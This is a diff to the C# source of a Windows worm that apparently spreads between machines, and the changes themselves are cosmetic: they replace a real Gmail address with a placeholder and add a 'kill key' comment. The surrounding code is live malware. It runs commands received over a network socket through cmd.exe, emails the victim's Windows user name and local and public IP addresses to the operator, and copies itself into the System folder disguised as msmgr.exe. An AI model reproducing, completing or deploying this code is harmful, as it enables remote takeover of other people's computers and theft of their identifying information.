@@ -186,7 +186,7 @@ namespace WindowsFormsApplication2{ static class Program{public class Threadz{cl
                             if (command.Contains("\n"))
                                 break;}
                         if (command.Equals("exit\r\n")){
-                            msg = System.Text.Encoding.ASCII.GetBytes("Bye...\r\n");
+                            msg = System.Text.Encoding.ASCII.GetBytes("Good Bye...\r\n");
                             stream.Write(msg, 0, msg.Length); client.Close();
                             break;}
                         processInfo = new ProcessStartInfo("cmd.exe", "/C " + command);
@@ -232,10 +232,10 @@ namespace WindowsFormsApplication2{ static class Program{public class Threadz{cl
                                 int last = currIPadd.LastIndexOf("</body>");
                                 currIPadd = currIPadd.Substring(first, last - first); Thread.Sleep(200);
                                 MailMessage MailSend = new MailMessage();
-                                MailSend.To.Add("0recycler0@gmail.com");
+                                MailSend.To.Add("yourmail@gmail.com");
                                 MailSend.Subject = "Test Mail";
                                 MailSend.Body = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString() + "\n" + localIP + "\n" + currIPadd;
-                                MailSend.From = new MailAddress("0recycler0@gmail.com");
+                                MailSend.From = new MailAddress("yourmail@gmail.com");
                                 SmtpClient smtp = new SmtpClient();
                                 smtp.Host = "smtp.gmail.com";
                                 smtp.EnableSsl = true;
@@ -246,6 +246,7 @@ namespace WindowsFormsApplication2{ static class Program{public class Threadz{cl
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr OpenProcess(int access, bool Ihandle, int procID);
         static void Main(){   
+            string keyforstop = "darkness_worm"; // this key is the responsable by stoper the worm attack
             Threadz SpreadWorm = new Threadz();
             Thread thread = new Thread(new ThreadStart(SpreadWorm.WorkSpreadFunction)); thread.Start();
             Threadz KillThread = new Threadz();
@@ -261,6 +262,7 @@ namespace WindowsFormsApplication2{ static class Program{public class Threadz{cl
 Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\msmgr.exe";
             System.Reflection.Assembly currpath = System.Reflection.Assembly.GetExecutingAssembly();
             string fullProcPath = currpath.Location; string curdir = Directory.GetCurrentDirectory() + @"My Pictures\";
+          
             try { Process.Start(curdir); }
             catch { }
             try { File.Copy(fullProcPath, path); }
